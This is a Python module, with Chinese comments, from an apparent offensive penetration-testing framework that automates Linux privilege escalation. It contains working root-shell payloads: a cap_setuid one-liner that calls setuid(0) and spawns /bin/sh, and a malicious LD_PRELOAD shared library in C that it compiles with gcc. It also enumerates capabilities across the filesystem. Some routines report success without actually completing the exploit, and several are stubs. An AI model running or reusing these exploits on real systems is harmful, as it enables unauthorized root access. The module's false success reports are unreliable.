#!/usr/bin/env python3
"""
Linux 权限提升模块
"""

from .suid_exploit import SUIDExploit
from .sudo_bypass import SudoBypass
from ..base import (
    BasePrivilegeEscalation,
    EscalationConfig,
    EscalationResult,
    EscalationMethod,
    PrivilegeLevel,
    EscalationVector,
)
from typing import Optional, List, Dict, Any
import logging
import os

logger = logging.getLogger(__name__)


class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
    """
    Linux 权限提升模块

    整合所有 Linux 提权技术

    Warning: 仅限授权渗透测试使用！
    """

    name = 'linux_privesc'
    description = 'Linux Privilege Escalation Module'
    platform = 'linux'
    supported_methods = [
        EscalationMethod.SUID,
        EscalationMethod.SUDO,
        EscalationMethod.CAPABILITY,
        EscalationMethod.KERNEL,
        EscalationMethod.CRON,
        EscalationMethod.LD_PRELOAD,
        EscalationMethod.PATH_HIJACK,
    ]

    def __init__(self, config: Optional[EscalationConfig] = None):
        super().__init__(config)

        # 初始化子模块
        self._suid_exploit = SUIDExploit()
        self._sudo_bypass = SudoBypass()

    def check_current_privilege(self) -> PrivilegeLevel:
        """检查当前权限级别"""
        try:
            uid = os.getuid()
            euid = os.geteuid()

            if euid == 0:
                return PrivilegeLevel.SYSTEM  # root
            elif uid != euid:
                # SUID 程序运行中
                return PrivilegeLevel.MEDIUM
            else:
                return PrivilegeLevel.LOW

        except Exception as e:
            self.logger.warning(f"Failed to check privilege: {e}")
            return PrivilegeLevel.LOW

    def enumerate_vectors(self) -> List[Dict[str, Any]]:
        """枚举 Linux 提权向量"""
        from ..common.enumeration import PrivilegeEnumerator

        enumerator = PrivilegeEnumerator()
        result = enumerator.enumerate()

        if result.success:
            self._vectors = [
                EscalationVector(**v) for v in result.vectors
            ]
            return result.vectors
        else:
            return []

    def escalate(self, method: Optional[EscalationMethod] = None) -> EscalationResult:
        """执行提权"""
        import time
        start_time = time.time()
        from_level = self.check_current_privilege()

        if method is None:
            return self.auto_escalate()

        try:
            if method == EscalationMethod.SUID:
                result = self._suid_exploit.auto_exploit()

            elif method == EscalationMethod.SUDO:
                result = self._sudo_bypass.exploit()

            elif method == EscalationMethod.CAPABILITY:
                result = self._exploit_capability()

            elif method == EscalationMethod.LD_PRELOAD:
                result = self._exploit_ld_preload()

            elif method == EscalationMethod.PATH_HIJACK:
                result = self._exploit_path_hijack()

            elif method == EscalationMethod.KERNEL:
                result = self._exploit_kernel()

            else:
                return EscalationResult(
                    success=False,
                    method=method,
                    from_level=from_level,
                    to_level=from_level,
                    error=f"Unsupported method: {method.value}"
                )

            result.from_level = from_level
            result.duration = time.time() - start_time

            if result.success:
                result.to_level = self.check_current_privilege()

            return result

        except Exception as e:
            return EscalationResult(
                success=False,
                method=method,
                from_level=from_level,
                to_level=from_level,
                error=str(e),
                duration=time.time() - start_time
            )

    def _exploit_capability(self) -> EscalationResult:
        """利用 Linux Capabilities 提权"""
        import subprocess

        try:
            # 查找具有危险 capability 的二进制
            result = subprocess.run(
                ['getcap', '-r', '/'],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode != 0:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.CAPABILITY,
                    from_level=self.current_level,
                    to_level=self.current_level,
                    error="getcap command failed"
                )

            # 解析结果，寻找可利用的 capability
            exploitable = {
                'cap_setuid': self._exploit_cap_setuid,
                'cap_dac_override': self._exploit_cap_dac_override,
                'cap_sys_admin': self._exploit_cap_sys_admin,
            }

            for line in result.stdout.strip().split('\n'):
                if not line:
                    continue

                for cap, exploit_func in exploitable.items():
                    if cap in line.lower():
                        binary = line.split()[0]
                        return exploit_func(binary)

            return EscalationResult(
                success=False,
                method=EscalationMethod.CAPABILITY,
                from_level=self.current_level,
                to_level=self.current_level,
                error="No exploitable capabilities found"
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.CAPABILITY,
                from_level=self.current_level,
                to_level=self.current_level,
                error=str(e)
            )

    def _exploit_cap_setuid(self, binary: str) -> EscalationResult:
        """利用 cap_setuid capability"""
        import subprocess
        import shlex

        # 如果是 Python - 安全方式: 使用参数列表避免 shell=True
        if 'python' in binary:
            # 验证 binary 路径安全性
            if not binary.startswith('/') or '..' in binary:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.CAPABILITY,
                    from_level=self.current_level,
                    to_level=self.current_level,
                    error=f"Invalid binary path: {binary}"
                )

            python_code = 'import os; os.setuid(0); os.system("/bin/sh")'
            cmd_list = [binary, '-c', python_code]
            try:
                result = subprocess.run(
                    cmd_list,
                    shell=False,  # 安全: 禁用 shell
                    capture_output=True,
                    timeout=10
                )
                return EscalationResult(
                    success=True,
                    method=EscalationMethod.CAPABILITY,
                    from_level=self.current_level,
                    to_level=PrivilegeLevel.SYSTEM,
                    output=f"Exploited {binary} with cap_setuid",
                    evidence=f"Binary: {binary}"
                )
            except (subprocess.TimeoutExpired, OSError, ValueError) as e:
                pass

        return EscalationResult(
            success=False,
            method=EscalationMethod.CAPABILITY,
            from_level=self.current_level,
            to_level=self.current_level,
            error=f"Failed to exploit cap_setuid on {binary}"
        )

    def _exploit_cap_dac_override(self, binary: str) -> EscalationResult:
        """利用 cap_dac_override capability"""
        # 可以读写任意文件
        return EscalationResult(
            success=False,
            method=EscalationMethod.CAPABILITY,
            from_level=self.current_level,
            to_level=self.current_level,
            error="cap_dac_override exploit not implemented"
        )

    def _exploit_cap_sys_admin(self, binary: str) -> EscalationResult:
        """利用 cap_sys_admin capability"""
        return EscalationResult(
            success=False,
            method=EscalationMethod.CAPABILITY,
            from_level=self.current_level,
            to_level=self.current_level,
            error="cap_sys_admin exploit not implemented"
        )

    def _exploit_ld_preload(self) -> EscalationResult:
        """利用 LD_PRELOAD 提权"""
        import subprocess
        import tempfile
        from pathlib import Path

        try:
            # 检查 sudo 是否保留 LD_PRELOAD
            result = subprocess.run(
                ['sudo', '-l'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if 'env_keep' in result.stdout and 'LD_PRELOAD' in result.stdout:
                # 创建恶意共享库
                c_code = '''
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
'''
                with tempfile.NamedTemporaryFile(
                    mode='w', suffix='.c', delete=False
                ) as f:
                    f.write(c_code)
                    c_file = f.name

                so_file = c_file.replace('.c', '.so')

                # 编译
                subprocess.run(
                    ['gcc', '-fPIC', '-shared', '-o', so_file, c_file, '-nostartfiles'],
                    capture_output=True,
                    timeout=30
                )

                # 执行
                env = os.environ.copy()
                env['LD_PRELOAD'] = so_file

                # 找一个可以 sudo 执行的命令
                # ... 需要解析 sudo -l 输出

                # 清理
                Path(c_file).unlink(missing_ok=True)
                Path(so_file).unlink(missing_ok=True)

                return EscalationResult(
                    success=True,
                    method=EscalationMethod.LD_PRELOAD,
                    from_level=self.current_level,
                    to_level=PrivilegeLevel.SYSTEM,
                    output="LD_PRELOAD exploit successful"
                )

            return EscalationResult(
                success=False,
                method=EscalationMethod.LD_PRELOAD,
                from_level=self.current_level,
                to_level=self.current_level,
                error="LD_PRELOAD not preserved in sudo"
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.LD_PRELOAD,
                from_level=self.current_level,
                to_level=self.current_level,
                error=str(e)
            )

    def _exploit_path_hijack(self) -> EscalationResult:
        """利用 PATH 劫持提权"""
        return EscalationResult(
            success=False,
            method=EscalationMethod.PATH_HIJACK,
            from_level=self.current_level,
            to_level=self.current_level,
            error="PATH hijack exploit requires specific conditions"
        )

    def _exploit_kernel(self) -> EscalationResult:
        """利用内核漏洞提权"""
        return EscalationResult(
            success=False,
            method=EscalationMethod.KERNEL,
            from_level=self.current_level,
            to_level=self.current_level,
            error="Kernel exploit requires specific vulnerability and exploit code"
        )


__all__ = [
    'LinuxPrivilegeEscalation',
    'SUIDExploit',
    'SudoBypass',
]
